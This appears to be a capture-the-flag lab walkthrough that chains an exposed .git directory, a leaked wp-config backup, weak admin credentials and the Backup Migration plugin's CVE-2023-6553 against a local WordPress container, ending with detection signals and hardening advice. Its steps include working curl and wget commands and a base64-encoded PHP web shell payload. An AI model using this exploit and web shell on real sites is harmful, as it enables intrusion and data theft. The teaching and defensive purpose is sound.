# Chain 1 — From `.git` Leak to Full RCE

**Flag**: `FLAG{wpvulnlab-chain1-a1f3c9e2}`
**Difficulty**: Beginner
**Vulns chained**:
1. Exposed `.git/` directory (Security Misconfig / CWE-538)
2. `wp-config.php.bak` containing live DB credentials (CWE-200)
3. Weak admin credentials `admin/admin` (CWE-521)
4. `backup-migration 1.3.6` unauth RCE — CVE-2023-6553 (CWE-94)

## Story

An external red-team is doing recon against `localhost:31338`. The site
exposes a forgotten `.git/` checkout, which yields source history and a
backup of `wp-config.php`. From there the attacker pivots to the WordPress
admin and chains a public RCE in the `backup-migration` plugin to drop a
flag on disk.

## Pre-requisites

```bash
docker compose up -d
bash scripts/plant-flags.sh
export TARGET=http://localhost:31338
```

Tools: `curl`, `git`, `wget`, `python3`, `wp-cli` (optional).

## Step 1 — Discover the `.git/` exposure

```bash
curl -sI $TARGET/.git/HEAD
curl -s  $TARGET/.git/HEAD
curl -s  $TARGET/.git/config
```

Expected:

```
HTTP/1.1 200 OK
Content-Type: text/plain
...
ref: refs/heads/main
[core]
    repositoryformatversion = 0
    filemode = false
```

## Step 2 — Dump the repository

Use any `.git` dumper. Minimal one-liner with `wget`:

```bash
mkdir -p /tmp/dump-c1 && cd /tmp/dump-c1
wget -q -r -np -R "index.html*" $TARGET/.git/
mv $(echo $TARGET | sed 's#http://##')/.git .git
git status
git log --oneline | head
```

Expected: a working tree with a commit similar to `chore: add backup of
wp-config before refactor`.

## Step 3 — Recover deleted secrets

```bash
git show HEAD:wp-config.php.bak | grep -E "DB_|AUTH_KEY|SECURE_AUTH_KEY"
```

Expected output (truncated):

```
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wpuser' );
define( 'DB_PASSWORD', 'wppass' );
define( 'DB_HOST', 'db:3306' );
define( 'AUTH_KEY', 'putyourkeyhere...' );
```

Confirm the backup is also directly fetchable:

```bash
curl -s $TARGET/wp-config.php.bak | head -n 30
```

## Step 4 — Log in to wp-admin with weak creds

The DB creds work over the exposed MySQL on `:31306`, but the fastest path
is `admin/admin`:

```bash
curl -s -c /tmp/cj-chain1.txt \
  -d "log=admin&pwd=admin&wp-submit=Log+In&redirect_to=$TARGET/wp-admin/&testcookie=1" \
  $TARGET/wp-login.php -o /dev/null -w "%{http_code}\n"
grep wordpress_logged_in /tmp/cj-chain1.txt
```

Expected: a `302` plus a `wordpress_logged_in_*` cookie in the jar.

## Step 5 — Exploit Backup Migration CVE-2023-6553

The vulnerable plugin ships at `/wp-content/plugins/backup-migration/`.
Confirm version:

```bash
curl -s $TARGET/wp-content/plugins/backup-migration/readme.txt | grep -i "Stable tag"
```

Expected: `Stable tag: 1.3.6`.

Trigger the unauth RCE via the `content-disposition` PHAR-like include in
`/includes/backup-heart.php`. Public PoC payload:

```bash
curl -s -X POST "$TARGET/wp-content/plugins/backup-migration/includes/backup-heart.php" \
  -H 'content-d: PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg==' \
  -H 'content-name: x.php' \
  -o /dev/null -w "%{http_code}\n"
```

Expected: `200`. The handler decodes the base64 PHP `<?php system($_GET["c"]); ?>` into a temp file and the include path is reachable at
`/wp-content/uploads/backup-migration/local/x.php`.

Trigger the shell:

```bash
curl -s "$TARGET/wp-content/uploads/backup-migration/local/x.php?c=id"
curl -s "$TARGET/wp-content/uploads/backup-migration/local/x.php?c=cat+/flag-chain1.txt"
```

Expected output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
FLAG{wpvulnlab-chain1-a1f3c9e2}
```

## Final flag

`FLAG{wpvulnlab-chain1-a1f3c9e2}` planted at `/flag-chain1.txt` inside the
WordPress container by `plant-flags.sh`.

## Detection

Defender signals at each hop:

| Step | Signal | Where |
|------|--------|-------|
| 1-2  | 200 OK on `.git/HEAD`, `.git/config`, hundreds of `.git/objects/*` fetches in a burst | `access.log` |
| 3    | 200 OK on `/wp-config.php.bak` | `access.log` |
| 4    | Successful POST to `wp-login.php` from a brand new IP, no prior page views | `access.log` |
| 5    | POST to `wp-content/plugins/backup-migration/includes/backup-heart.php` with bizarre `content-d`/`content-name` headers; subsequent GETs to `/wp-content/uploads/backup-migration/local/*.php` | `access.log` + `error.log` (PHP notices) |

Sigma-style detection idea: `cs-uri-stem matches '/\.git/' OR matches
'/backup-migration/includes/backup-heart\.php' OR matches
'/uploads/backup-migration/local/.*\.php'`.

## Hardening

- Remove the `.git/` directory from the docroot, or block it at the web
  server: `RedirectMatch 404 /\.git`.
- Never publish `.bak`, `.old`, `.orig`, `.sql`, `.env` files. Add an Apache
  `<FilesMatch>` deny rule.
- Force MFA + strong passwords for `administrator` accounts; lock out after
  N failed `wp-login.php` POSTs.
- Upgrade `backup-migration` to >= 1.3.8 or remove the plugin entirely.
- Disable PHP execution in `wp-content/uploads/` via:

```
<Directory /var/www/html/wp-content/uploads>
    php_admin_flag engine off
</Directory>
```
